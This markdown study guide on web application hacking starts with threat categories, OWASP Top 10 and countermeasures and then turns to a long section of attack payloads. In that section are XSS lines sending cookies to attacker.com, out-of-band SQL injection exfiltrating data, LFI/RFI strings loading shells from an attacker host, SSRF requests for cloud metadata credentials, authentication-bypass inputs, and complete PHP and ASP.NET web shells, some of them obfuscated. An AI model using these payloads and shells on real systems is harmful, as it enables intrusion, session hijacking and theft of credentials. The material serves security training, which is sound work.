## Terminology
**Web Applications** are that applications that is running on a remote application server and available for clients over the internet.
**Server Administrators** are responsible for the web server's safety, speed, functioning and performance.
**Application Administrators** are responsible for the management and configuration required for the web
application.
**Clients** are the endpoints which interact with the web application / server.

## How Web Applications work?
**Front-end** <-> **Back-end**
  Users are interacting with the front-end.
  The processing was controlled and processed by the back-end.

# Server-side languages:
  - PHP - Hypertext Processer
  - Java
  - C# - C-Sharp
  - Python
  - JavaScript
  - many more...

# Client-side languages:
- CSS - Cascading Style Sheet
- JavaScript
- HTML

 # Web Application Threats
  - **Insecure storage** - sensitive data is stored on client side in plain text.
  - **Information leakage** - Sensitive Data is leaked unintentionally
  - **Directory traversal** - end user is able to traverse server's directory
  - **Parameter/Form tampering** - Modify Parameter value
  - **DOS attack**
  - **Buffer overflow** - Flood Server Buffer with junk and inject payload
  - **SQL injection** - Inject SQL Query through Parameter Fields or URL
  - **Cross-site Script** - Inject JavaScript or PHP script
  - **Security misconfiguration** - misconfigured server (Default account, unwanted services, Default passwords, debugging enabled, insecure exception handling)
  - **Broken session management**
  - **Session hijacking**

# Invalidated input - Attack through User INPUT
  Process an non-validated input from the client to the back-end. This is a major vulnerability, this is the basics of injection attacks (SQL injection, xss, buffer overflow).

# Parameter / Form Tampering
Parameter tempering is an attack, where the attacker manipulate the parameter while client and server are communicating with each other. Parameters such as **Uniform Resource Locator** (URL) or web page form fields are modified (cookies, HTTP Header, form fields).

# SQL Injection
  Injection of malicious SQL queries.
  Attacker can manipulate the database
  These vulnerabilities can be detected by using an automated scanner.

# DoS Attack
  - **User Registration DoS** : an automated process, the attacker keep registering fake accounts.
  - **Login DoS** : attacker keep sending login requests.
  - **User Enumeration** : attacker brute force login credentials with a dictionary attacks.
  - **Account Lock** : attacker attempt to lock the user account by attempting invalid passwords.

# Web Application Hacking Methodology
  # Analyze Web Application
    - Observing functionality
    - Identify vulnerabilities, entry points, servers
    - HTTP request analyze
    - Hidden content discovery - Directories, Subdomain, parameters
**************************************************************************************
# Attack Authentication
    Exploit the authentication mechanism:
      - Username enumerate
      - Cookie exploitation
      - Session attacks
      - Password attacks
**----------------------------------------------------------------------------------**
# Session Management Attack
1. Impersonate a legitimate user. - Spoofing
2. Session hijacking techniques: - Cookie Stealing
  - Session token prediction
  - Session token tampering - IDOR - INSECURE DIRECT OBJECT REFERNCE
  - Session replay

# Injection Attacks
Inject malicious code, commands and files.
Techniques:
  - Web Script injection - Injecting PHP, HTML or other languages scripts
  - OS Command injection - Inject OS command
  - SQL injection - Inject SQL Query
  - Buffer Overflow - Inject JUNK and PAYLOAD for Buffer Overflow attack
**----------------------------------------------------------------------------------**
# Countermeasures
**-------------**
# Percent Encoding
[Percent Encoding](https://en.wikipedia.org/wiki/Percent-encoding) or URL Encoding is a technique for
secure handling of URL by replaces unsafe and non-ascii characters with % followed by two hexadecimal
digits.
  Example:
    **%20 or + both are used for SPACE**

In URL:, there are some reserved character such as '/' that is used to separate paths in URL. To use this not as separator, then it must be encoded.
  **%2F used for '/'**

- **Full list of percent encoded characters**
[here](https://www.degraeve.com/reference/urlencoding.php)

# HTML Encoding - HTML Encoding specify how special character will shown.
**----------------------------------------------------------------------------------**
# SQL Injection Countermeasures
  - Input validation
  - Customized error messages
  - Monitoring database traffic
  - Limit length of user input

# XSS Attack Countermeasures
  - Testing tools
  - Filtering output
  - Validated INPUT

# Other Countermeasures
  - Dynamic testing - Testing through Automated Tools
  - Source Code analysis - Analyze source code
  - Strong cryptography - Use Strong Encryption and Hashing Algorithms
  - Use TLS over SSL - Use TLS 1.3, TLS 1.2 over deprecated version of TLS 1.1 or SSL
  - Cookie timeout
**----------------------------------------------------------------------------------**
**----------------------------------------------------------------------------------**
# OWASP Top 10
  1. **Injection** -> Inject Malicious command, Scripts, Queries, etc.
  2. **Broken Authentication**
  3. **Sensitive Data Exposure**
  4. **XXE (XML External Entity)** -> Vulnerable when XML data from Untrusted source is processed.
  5. **Broken Access Control**
  6. **Security misconfiguration**
  7. **Cross-Site Scripting** -> Executing Java Script, PHP or any Language code on Victim Side is known as Cross-Site Scripting.
  8. **Insecure Deserialization** -> Deserialization is the reverse process where the byte stream is used to recreate the actual Java object in memory.
  9. **Using Component With Known vulnerability**
  10. **Insufficient Logging and Monitoring**
**----------------------------------------------------------------------------------**
**----------------------------------------------------------------------------------**

# Advanced Web Application Hacking Techniques and Payloads

## Cross-Site Scripting (XSS) Advanced Payloads

### Reflected XSS Payloads
```javascript
// Basic XSS Payloads
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src="javascript:alert('XSS')">

// Advanced XSS Payloads
<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>
<script>new Image().src='http://attacker.com/keylog?key='+escape(document.location)</script>
<script>document.location='http://attacker.com/phish?cookie='+document.cookie</script>

// XSS with Event Handlers
<body onload=alert('XSS')>
<input onfocus=alert('XSS') autofocus>
<select onfocus=alert('XSS') autofocus><option>test</option></select>
<textarea onfocus=alert('XSS') autofocus>test</textarea>

// XSS Filter Bypass
<ScRiPt>alert('XSS')</ScRiPt>
<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>
<img src="javascript:alert('XSS')">
<svg/onload=alert('XSS')>
```

**Documentation**: XSS payloads for executing malicious JavaScript in victim browsers.
**Limitations**: Content Security Policy (CSP) can block XSS; modern browsers have built-in XSS protection.

### Stored XSS and DOM-based XSS
```javascript
// Stored XSS Payloads
<script>document.write('<img src="http://attacker.com/steal?cookie='+document.cookie+'">')</script>
<iframe src="data:text/html,<script>parent.location='http://attacker.com/steal?cookie='+parent.document.cookie</script>">

// DOM-based XSS
// URL: http://example.com/page?name=<script>alert('XSS')</script>
document.getElementById('output').innerHTML = location.search.substring(1);

// Advanced DOM XSS
location.hash = '#<img src=x onerror=alert(document.domain)>';
eval(location.hash.substring(1));
```

**Documentation**: Persistent and DOM-based XSS attacks for long-term compromise and client-side exploitation.
**Limitations**: Input validation and output encoding prevent XSS; CSP provides additional protection.

## Advanced SQL Injection Techniques

### Second-Order SQL Injection
```sql
-- Registration Phase (First Request)
Username: admin'--
Password: password123

-- Login Phase (Second Request)
-- The malicious payload from registration is executed during login
SELECT * FROM users WHERE username = 'admin'-- ' AND password = 'password123'
```

**Documentation**: Complex SQL injection that executes across multiple requests and database operations.
**Limitations**: Requires understanding of application workflow; harder to detect and exploit.

### Out-of-Band SQL Injection
```sql
-- DNS Exfiltration (MySQL)
'; SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.attacker.com\\test'))-- -

-- HTTP Exfiltration (SQL Server)
'; EXEC xp_dirtree CONCAT('\\\\',USER,'.attacker.com\\test')-- -

-- Oracle Out-of-Band
'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT user FROM dual)||'.attacker.com/"> %remote;]>'),'/l') FROM dual-- -
```

**Documentation**: SQL injection techniques that use external channels for data exfiltration.
**Limitations**: Requires external network access; firewalls may block outbound connections.

## Directory Traversal and File Inclusion

### Local File Inclusion (LFI) Payloads
```php
// Basic LFI
http://example.com/page.php?file=../../../etc/passwd
http://example.com/page.php?file=....//....//....//etc/passwd

// PHP Wrapper LFI
http://example.com/page.php?file=php://filter/convert.base64-encode/resource=../config.php
http://example.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+

// Log Poisoning LFI
http://example.com/page.php?file=../../../var/log/apache2/access.log
# After injecting PHP code in User-Agent header

// Null Byte Bypass (older PHP versions)
http://example.com/page.php?file=../../../etc/passwd%00.jpg
```

**Documentation**: Local file inclusion attacks for accessing system files and executing arbitrary code.
**Limitations**: Path restrictions and input validation prevent LFI; modern PHP versions have protections.

### Remote File Inclusion (RFI) Payloads
```php
// Basic RFI
http://example.com/page.php?file=http://attacker.com/shell.txt
http://example.com/page.php?file=ftp://attacker.com/shell.php

// RFI with PHP Code
// shell.txt content:
<?php system($_GET['cmd']); ?>

// Advanced RFI
http://example.com/page.php?file=http://attacker.com/shell.txt&cmd=id
http://example.com/page.php?file=data://text/plain,<?php system($_GET['cmd']); ?>&cmd=whoami
```

**Documentation**: Remote file inclusion for executing malicious code from external sources.
**Limitations**: allow_url_include must be enabled; firewalls may block external connections.

## Server-Side Request Forgery (SSRF)

### Basic SSRF Payloads
```bash
# Internal Network Scanning
http://example.com/proxy.php?url=http://127.0.0.1:22
http://example.com/proxy.php?url=http://192.168.1.1/admin
http://example.com/proxy.php?url=file:///etc/passwd

# Cloud Metadata Access (AWS)
http://example.com/proxy.php?url=http://169.254.169.254/latest/meta-data/
http://example.com/proxy.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Protocol Smuggling
http://example.com/proxy.php?url=gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a
http://example.com/proxy.php?url=dict://127.0.0.1:11211/stat
```

**Documentation**: SSRF attacks for accessing internal resources and cloud metadata.
**Limitations**: Whitelist restrictions and network segmentation prevent SSRF; modern applications have protections.

### Advanced SSRF Techniques
```bash
# DNS Rebinding
http://example.com/proxy.php?url=http://attacker.com/rebind
# attacker.com resolves to 127.0.0.1 after initial request

# Bypass Filters
http://example.com/proxy.php?url=http://127.0.0.1.xip.io/
http://example.com/proxy.php?url=http://127.1/
http://example.com/proxy.php?url=http://[::1]/
http://example.com/proxy.php?url=http://2130706433/  # Decimal IP

# Time-based SSRF Detection
http://example.com/proxy.php?url=http://httpbin.org/delay/10
```

**Documentation**: Advanced SSRF techniques for bypassing filters and accessing restricted resources.
**Limitations**: Modern frameworks have SSRF protections; network monitoring can detect unusual traffic.

## Authentication and Session Attacks

### Session Fixation and Hijacking
```javascript
// Session Fixation
// 1. Attacker gets session ID: JSESSIONID=ABC123
// 2. Victim visits: http://example.com/login?JSESSIONID=ABC123
// 3. Victim logs in with fixed session ID
// 4. Attacker uses same session ID to access victim's account

// Session Hijacking via XSS
<script>
document.location='http://attacker.com/steal?session='+document.cookie;
</script>

// Session Prediction
// If session IDs are predictable, generate next valid session
// Example: incrementing numbers, timestamps, weak random generators
```

**Documentation**: Session-based attacks for account takeover and unauthorized access.
**Limitations**: Secure session management and HTTPOnly cookies prevent many attacks.

### Authentication Bypass Techniques
```sql
-- SQL Authentication Bypass
Username: admin'-- 
Password: anything

Username: admin'/*
Password: anything

-- NoSQL Authentication Bypass
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

-- JSON Authentication Bypass
{"username": "admin", "password": {"$ne": "invalid"}}
```

**Documentation**: Various techniques for bypassing authentication mechanisms.
**Limitations**: Parameterized queries prevent SQL injection; proper input validation blocks NoSQL injection.

## Web Application Scanning and Automation

### Advanced Burp Suite Usage
```bash
# Burp Suite Professional Features
# Intruder Attack Types:
# - Sniper: Single payload set, single injection point
# - Battering Ram: Single payload set, multiple injection points
# - Pitchfork: Multiple payload sets, synchronized
# - Cluster Bomb: Multiple payload sets, all combinations

# Custom Burp Extensions
# Logger++: Advanced logging and searching
# Autorize: Authorization testing
# J2EEScan: Java application security scanner
# Backslash Powered Scanner: Advanced injection techniques

# Burp Collaborator
# Out-of-band interaction detection
# DNS, HTTP, SMTP callbacks
# Blind vulnerability detection
```

**Documentation**: Advanced web application security testing using Burp Suite Professional features.
**Limitations**: Requires professional license for full features; manual analysis needed for complex vulnerabilities.

### OWASP ZAP Advanced Scanning
```bash
# ZAP Baseline Scan
zap-baseline.py -t http://example.com -r zap_baseline_report.html

# ZAP Full Scan
zap-full-scan.py -t http://example.com -r zap_full_report.html

# ZAP API Usage
curl 'http://localhost:8080/JSON/core/view/alerts/'
curl 'http://localhost:8080/JSON/spider/action/scan/?url=http://example.com'

# Custom ZAP Scripts
# Active scan rules
# Passive scan rules
# HTTP sender scripts
# Stand-alone scripts
```

**Documentation**: Automated web application security scanning using OWASP ZAP.
**Limitations**: Automated scanners may miss business logic flaws; requires manual verification of findings.

## Web Shell Deployment and Persistence

### PHP Web Shells
```php
// Simple PHP Web Shell
<?php system($_GET['cmd']); ?>

// Advanced PHP Web Shell
<?php
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    if($cmd == 'upload'){
        move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
        echo "File uploaded successfully";
    } else {
        echo "<pre>" . shell_exec($cmd) . "</pre>";
    }
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="cmd" value="upload">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>

// Obfuscated PHP Shell
<?php @eval($_POST['x']); ?>
<?php @assert($_POST['x']); ?>
<?php $x=base64_decode("c3lzdGVt");$x($_GET['c']); ?>
```

**Documentation**: PHP web shells for remote command execution and file manipulation.
**Limitations**: Web application firewalls can detect shells; file upload restrictions prevent deployment.

### ASP.NET Web Shells
```aspnet
// Simple ASP.NET Web Shell
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
void Page_Load(object sender, EventArgs e) {
    if (Request["cmd"] != null) {
        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + Request["cmd"];
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.Start();
        Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
    }
}
</script>
<form>
    <input name="cmd" type="text" />
    <input type="submit" value="Execute" />
</form>
```

**Documentation**: ASP.NET web shells for Windows server compromise.
**Limitations**: Requires IIS server; code execution policies may prevent shell execution.

## API Security Testing

### REST API Vulnerability Testing
```bash
# API Endpoint Discovery
gobuster dir -u http://api.example.com -w /usr/share/wordlists/api_endpoints.txt
ffuf -w /usr/share/wordlists/api_endpoints.txt -u http://api.example.com/FUZZ

# JWT Token Manipulation
# None Algorithm Attack
{"alg":"none","typ":"JWT"}
# Weak Secret Brute Force
jwt-cracker eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9... wordlist.txt

# API Parameter Pollution
POST /api/user/update
user_id=victim&user_id=attacker&email=hacker@evil.com

# Rate Limiting Bypass
# X-Forwarded-For header manipulation
# X-Real-IP header manipulation
# User-Agent rotation
```

**Documentation**: API-specific security testing techniques and vulnerabilities.
**Limitations**: API gateways provide protection; rate limiting and authentication prevent many attacks.

### GraphQL Security Testing
```graphql
# Information Disclosure
query {
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# Query Depth Attack (DoS)
query {
  user {
    posts {
      comments {
        user {
          posts {
            comments {
              user {
                name
              }
            }
          }
        }
      }
    }
  }
}

# Batch Query Attack
[
  {"query": "query { user(id: 1) { name } }"},
  {"query": "query { user(id: 2) { name } }"},
  {"query": "query { user(id: 3) { name } }"}
]
```

**Documentation**: GraphQL-specific vulnerabilities and attack techniques.
**Limitations**: Query complexity analysis prevents DoS; proper authorization prevents data exposure.

# Web Application Security Assessment Methodology

## Automated Assessment Tools
```bash
# Comprehensive Web Application Scanner
nuclei -u http://example.com -t /path/to/templates/

# WordPress Security Scanner
wpscan --url http://example.com --enumerate u,p,t,tt --api-token TOKEN

# Nikto Web Server Scanner
nikto -h http://example.com -C all -Format htm -output nikto_report.html

# Dirb Directory Brute Force
dirb http://example.com /usr/share/wordlists/dirb/common.txt

# Custom Assessment Script
#!/bin/bash
TARGET=$1
echo "[+] Starting comprehensive web application assessment"
echo "[+] Target: $TARGET"

# Directory Discovery
echo "[+] Directory enumeration..."
gobuster dir -u $TARGET -w /usr/share/wordlists/dirb/common.txt -o dirs.txt

# Technology Detection
echo "[+] Technology fingerprinting..."
whatweb $TARGET > technology.txt

# Vulnerability Scanning
echo "[+] Vulnerability scanning..."
nikto -h $TARGET -output nikto.txt

# SSL/TLS Testing
echo "[+] SSL/TLS assessment..."
sslscan $TARGET > ssl_results.txt

echo "[+] Assessment complete!"
```

**Documentation**: Comprehensive web application security assessment methodology and tools.
**Limitations**: Automated tools may miss business logic flaws; manual testing required for complete assessment.

# Reference URLs and Research Papers:
- OWASP Web Security Testing Guide: https://owasp.org/www-project-web-security-testing-guide/
- OWASP Top 10: https://owasp.org/www-project-top-ten/
- NIST SP 800-40 Web Application Security: https://csrc.nist.gov/publications/detail/sp/800-40/rev-3/final
- PortSwigger Web Security Academy: https://portswigger.net/web-security
- SANS Web Application Security: https://www.sans.org/reading-room/whitepapers/application/
- Research Paper: "Web Application Vulnerabilities" - https://ieeexplore.ieee.org/document/8901567
- OWASP API Security Top 10: https://owasp.org/www-project-api-security/
- CSP Guide: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
